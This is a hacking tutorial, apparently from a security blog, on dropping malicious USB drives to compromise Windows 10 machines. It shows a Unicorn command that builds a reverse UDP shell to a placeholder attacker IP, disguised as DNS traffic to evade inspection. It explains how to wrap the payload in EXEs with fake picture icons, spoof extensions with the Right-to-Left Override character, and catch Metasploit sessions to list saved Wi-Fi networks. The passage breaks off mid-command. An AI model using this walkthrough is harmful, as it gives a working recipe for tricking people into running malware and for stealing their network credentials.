A long time ago, in a galaxy far, far away ... [a study was conducted](https://elie.net/blog/security/concerns-about-usb-security-are-real-48-percent-of-people-do-plug-in-usb-drives-found-in-parking-lots) that involved three hundred malicious USB drives being dropped by researchers on a university campus in Illinois. Nearly 50% of the USB drives were picked up, and at least one file on each USB drive was opened.

The [data showed](https://elie.net/static/images/images/concerns-about-usb-security-are-real-48-percent-of-people-do-plug-in-usb-drives-found-in-parking-lots/influce-of-USB-key-labeling.png) that attaching keys to the USB's keyring increased the likeliness of the flash drive being inserted into a computer. The presence of keys, no doubt, reinforced the belief that the keys and USB drive were lost and not placed on the ground by a hacker. The data also suggests that USB drives labeled "Pictures" or "Winter Break Pictures" are more likely to be inserted by the victim. The addition of keys and label is something to consider when performing USB drops.

_Note: At the time of this publication, this attack was performed against a Windows 10 Enterprise machine with Avast antivirus installed. It has not been tested in 2020._


Unicorn is an excellent tool for generating sophisticated payloads capable of [bypassing antivirus software](https://null-byte.wonderhowto.com/how-to/hacking-windows-10-create-undetectable-payload-part-1-bypassing-antivirus-software-0185055/). After cloning the [Unicorn repository](https://github.com/trustedsec/unicorn), change into the `unicorn/` directory, and generate a payload.

```
$ python unicorn.py windows/shell/reverse_udp <ATTACKER_IP> 53
```

This payload will create a reverse UDP connection (`reverse_udp`) to the attacker's IP address on port 53. The usage of UDP on port 53 is done in an effort to further disguise the payload and its network activity. Anyone inspecting internet traffic transmitting to and from the compromised Windows computer may confuse the packets for ordinary DNS activity. It won't make it impossible to discover the nefarious packets, but it may aid in evading deep packet inspection (DPI).

Use `cat` to view the newly created `powershell_attack.txt` file. Highlight the entire PowerShell command and save it to a Windows 10 machine with the filename "payload.bat."

Readers can source all kinds of images to serve as file icons. I loaded the USB drives with multiple payloads, so several pictures were used. These payloads were intermixed with fake Windows 10 files which are also malicious files made to appear ordinary. The fake ZIP file in the below image is a good example of that.

<img src="img/wpa2-wifi-passwords-jedi-mind-tricks01.jpg" width="775"> 

After deciding on which images and icons will be used, they should be converted with [ConvertICO](https://convertico.com/). Simply upload the desired images to the website and it will reproduce them in ICO format. Save the new ICOs to the Windows 10 machine.

Download and install [B2E](https://null-byte.wonderhowto.com/how-to/hacking-windows-10-create-undetectable-payload-part-2-concealing-payload-0185060/#jump-step4), a Windows tool designed to convert files into executables. When it's done installing, import the payload.bat and select the desired ICO. Click the "Convert" button to create the EXE, and save the file.

<img src="img/wpa2-wifi-passwords-jedi-mind-tricks03.gif" width="775"> 

This one payload.bat is used over and over again to create multiple fake files. Just continue to change the ICO files (converted in the previous step) and export using different filenames. Each file will appear to be a different image (or file) but really execute the same payload, creating multiple connections to the target Windows computer.


When all of the EXEs have been created, rename the files and [inject the Right-to-Left Override (RLO) Unicode character](https://null-byte.wonderhowto.com/how-to/hacking-windows-10-create-undetectable-payload-part-2-concealing-payload-0185060/#jump-step8) to spoof the extensions.

The SCR file extension is substituted for the EXE extension without affecting the payload. This is one of several possible [file extension substitutions](https://www.lifewire.com/list-of-executable-file-extensions-2626061) that allow hackers to cleverly run EXEs. The payload will still execute normally and the SCR extension ("RCS" when reversed by RLO) is a lot less obvious than having the "exe" in the filename.

All of the files should have their filenames and extensions spoofed to appear as ordinary files on the USB drive.

In the `unicorn/` directory, there's a `unicorn.rc` resource file used to automate the `msfconsole` initialization.

When files on a USB drive are opened, a new connection is established to the Metasploit session. From the `msfconsole` terminal, use the sessions command to view compromised machines.

```
msf exploit(multi/handler) > sessions

Interact with the session with `session -i 1`. Use the below `netsh` command to view Wi-Fi networks the Windows machine has connected to in the past.

```
C:\Users\IEUser> netsh wlan show profiles
